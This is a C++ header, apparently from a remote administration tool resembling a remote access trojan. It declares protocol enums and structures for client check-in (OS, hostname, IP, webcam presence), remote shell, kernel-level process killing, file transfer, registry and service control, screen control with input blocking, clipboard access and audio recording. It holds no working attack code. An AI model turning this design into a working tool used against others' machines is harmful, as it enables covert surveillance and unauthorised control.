#pragma once

#include <iostream>
#include <string>
#include <vector>
using namespace std;

BOOL SeIsValidPointer(PVOID BaseData, ULONG BufferLength);
void SeAssert(BOOL Assert, LPCWSTR Message);
#define SE_ASSERT(Code, Message)       SeAssert((BOOL)(Code),(LPCWSTR)Message);


//typedef struct
//{
//	char* TitleData;          //列表的名称
//	int		TitleWidth;            //列表的宽度
//}COLUMN_DATA;
#pragma pack(1) //防止数据包自定义对齐
struct _PROCESS_INFORMATION_
{
	ULONG32 ProcessID;
	char   ImageNameData[MAX_PATH];
	char   ProcessFullPathData[MAX_PATH];
};

enum
{
	// 文件传输方式
	TRANSFER_MODE_NORMAL = 0x00,	//一般,如果本地或者远程已经有，取消
	TRANSFER_MODE_ADDITION,			//追加
	TRANSFER_MODE_ADDITION_ALL,		//全部追加
	TRANSFER_MODE_COVER,		    //覆盖
	TRANSFER_MODE_COVER_ALL,	    //全部覆盖
	TRANSFER_MODE_JUMP,				//覆盖
	TRANSFER_MODE_JUMP_ALL,			//全部覆盖
	TRANSFER_MODE_CANCEL,			//取消传送
};

namespace PROCESS_MANAGER
{

	typedef enum
	{
		CLIENT_MODE = 1,   //Both
		SERVER_MODE
	}PROCESS_MANAGER_RUN_MODE;

}

namespace WINDOW_MANAGER
{

	typedef enum
	{
		CLIENT_MODE = 1,   //Both
		SERVER_MODE
	}WINDOW_MANAGER_RUN_MODE;

}


namespace FILE_MANAGER
{

	typedef enum
	{
		CLIENT_MODE = 1,   //Both
		SERVER_MODE
	}FILE_MANAGER_RUN_MODE;

}


namespace SERVICE_MANAGER
{

	typedef enum
	{
		CLIENT_MODE = 1,   //Both
		SERVER_MODE
	}SERVICE_MANAGER_RUN_MODE;

}


namespace REGISTER_MANAGER
{

	typedef enum
	{
		CLIENT_MODE = 1,   //Both
		SERVER_MODE
	}REGISTER_MANAGER_RUN_MODE;

}


//自定义数据包信息头
// 不合法的数据包
#pragma pack(1)
typedef struct  _LOGIN_INFO
{
	BYTE			IsToken;		    //信息头部
	OSVERSIONINFOEX	OsVersionInfoEx;	// 版本信息
	char ProcessorNameStringData[MAX_PATH];	// CPU主频
	IN_ADDR			ClientAddressData;		// 存储32位的IPv4的地址数据结构
	char			HostNameData[MAX_PATH];	// 主机名
	BOOL			IsWebCameraExist;		// 是否有摄像头
	DWORD			WebSpeed;		// 网速
}LOGIN_INFO, * PLOGIN_INFOR;



enum
{
	CMD_MANAGER_DIALOG = 1,
	PROCESS_MANAGER_DIALOG,
	WINDOW_MANAGER_DIALOG,
	REMOTE_CONTROLL_DIALOG,
	FILE_MANAGER_DIALOG,
	SERVICE_MANAGER_DIALOG,
	REGISTER_MANAGER_DIALOG,
	AUDIO_MANAGER_DIALOG,

};



enum
{
	CLIENT_LOGIN,				// 上线包
	CLIENT_GET_OUT,             // 强制下线用户
	CLIENT_GO_ON,
	CLIENT_INSTANT_MESSAGE_REQUEST,
	CLIENT_INSTANT_MESSAGE_REPLY,
	CLIENT_INSTANT_MESSAGE_COMPLETE,
	CLIENT_SHUT_DOWN_REQUEST,
	CLIENT_SHUT_DOWN_REPLY,
	CLIENT_CMD_MANAGER_REQUIRE,
	CLIENT_CMD_MANAGER_REPLY,
	CLIENT_PROCESS_MANAGER_REQUIRE,
	CLIENT_PROCESS_MANAGER_REPLY,
	CLIENT_PROCESS_REFRESH_REQUIRE,
	CLIENT_PROCESS_RING3_KILL_REQUIRE,
	CLIENT_PROCESS_RING0_KILL_REQUIRE,
	CLIENT_PROCESS_KILL_REPLY,
	CLIENT_FILE_MANAGER_REQUIRE,
	CLIENT_FILE_MANAGER_REPLY,
	CLIENT_FILE_LIST_REQUIRE,
	CLIENT_FILE_LIST_REPLY,
	CLIENT_FILE_MANAGER_SEND_FILE_INFORMATION,   //服务器向客户端发送一个要传送文件的文件信息(文件大小)
	CLIENT_FILE_MANAGER_TRANSFER_MODE_REQUIRE,
	CLIENT_FILE_MANAGER_SET_TRANSFER_MODE,
	CLIENT_FILE_MANAGER_FILE_DATA,
	CLIENT_FILE_MANAGER_FILE_DATA_CONTINUE,
	CLIENT_WINDOW_MANAGER_REQUIRE,
	CLIENT_WINDOW_MANAGER_REPLY,
	CLIENT_WINDOW_REFRESH_REQUIRE,
	CLIENT_REMOTE_CONTROLL_REQUIRE,
	CLIENT_REMOTE_CONTROLL_REPLY,
	CLIENT_REMOTE_CONTROLL_FIRST_SCREEN,
	CLIENT_REMOTE_CONTROLL_NEXT_SCREEN,
	CLIENT_REMOTE_CONTROLL_CONTROL,
	CLIENT_REMOTE_CONTROLL_BLOCK_INPUT,
	CLIENT_REMOTE_CONTROLL_GET_CLIPBOARD_REQUIRE,
	CLIENT_REMOTE_CONTROLL_GET_CLIPBOARD_REPLY,
	CLIENT_REMOTE_CONTROLL_SET_CLIPBOARD_REQUIRE,
	CLIENT_REMOTE_CONTROLL_SET_CLIPBOARD_REPLY,
	CLIENT_AUDIO_MANAGER_REQUIRE,
	CLIENT_AUDIO_MANAGER_REPLY,
	CLIENT_AUDIO_MANAGER_RECORD_DATA,
	CLIENT_SERVICE_MANAGER_REQUIRE,
	CLIENT_SERVICE_MANAGER_REPLY,
	CLIENT_SERVICE_CONFIG_REQUIRE,
	CLIENT_REGISTER_MANAGER_REQUIRE,
	CLIENT_REGISTER_MANAGER_REPLY,
	CLIENT_REGISTER_MANAGER_DATA_CONTINUE,
	CLIENT_REGISTER_MANAGER_PATH_DATA_REPLY,
	CLIENT_REGISTER_MANAGER_KEY_DATA_REPLY,


};
//权限操作
BOOL EnableSeDebugPrivilege(IN const CHAR* PriviledgeName, BOOL IsEnable);
//字符串操作
VOID ShowErrorMessage(CHAR* Class, CHAR* Message);
BOOL WcharToChar(char** DestinationString, wchar_t* SourceString, SIZE_T SourceStringLength);


typedef SIZE_T(*LPFN_SEENUMPROCESSLIST)(vector<_PROCESS_INFORMATION_>&);
typedef BOOL(*pfnRing3KillProcess)(PULONG, ULONG);

enum MODULE_TYPE
{
	MODULE_X86,
	MODULE_X64,
};
#pragma pack(1)
struct _PROCESS_MODULE_INFORMATION_
{
	ULONG64   ModuleBase;                                //操作系统中可能存在64位与32位的程序
	size_t    ModuleSize;
	WCHAR     ModuleFullPathData[MAX_PATH];
	MODULE_TYPE ModuleType;
};

typedef SIZE_T(*LPFN_SEENUMPROCESSMODULELIST)(ULONG ProcessID, vector<_PROCESS_MODULE_INFORMATION_>&);

//文件
#pragma pack(1)
typedef
struct _HARD_DISK_INFORMATION_
{
	char  HardDiskName[2];
	char  DisplayName[MAX_PATH];
	DWORD HardDiskIcon;
	BOOL  IsDirectory;
	char  FileSystem[MAX_PATH + 1];
	char  HardDiskType[80];
	float HardDiskAmountMB;
	float HardDiskFreeSpaceMB;
}HARD_DISK_INFORMATION;

typedef SIZE_T(*LPFN_GETLOCALHARDDISKINFO)(vector<_HARD_DISK_INFORMATION_>& HardDiskInfo);


//服务
typedef struct _SERVICE_INFORMATION_
{
	CHAR ServiceName[MAX_PATH];
	CHAR DisplayName[MAX_PATH];
	char CurrentState[MAX_PATH];
	char RunWay[MAX_PATH];
	char BinaryPathName[MAX_PATH * 2];


}SERVICE_INFORMATION, * PSERVICE_INFORMATION;
typedef SIZE_T(*LPFN_SEENUMSERVICELIST)(vector<_SERVICE_INFORMATION_>& ServiceInfo);



////注册表
//enum MYKEY {
//	MHKEY_CLASSES_ROOT,
//	MHKEY_CURRENT_USER,
//	MHKEY_LOCAL_MACHINE,
//	MHKEY_USERS,
//	MHKEY_CURRENT_CONFIG
//};

typedef
struct _REGISTER_ITEM_INFORMATION_
{
	char ItemName[MAX_PATH];
	DWORD ItemType;
	char ItemData[MAX_PATH];
}REGISTER_ITEM_INFORMATION, * PREGISTER_ITEM_INFORMATION;


typedef SIZE_T(*LPFN_SEENUMREGISTERDIRLIST)(vector<string>& RegisterInfoDir,
	char* FullPathData, ULONG FullPathLength);

typedef SIZE_T(*LPFN_SEENUMREGISTERITEMLIST)(vector<REGISTER_ITEM_INFORMATION>& RegisterInfoItem,
	char* FullPathData, ULONG FullPathLength);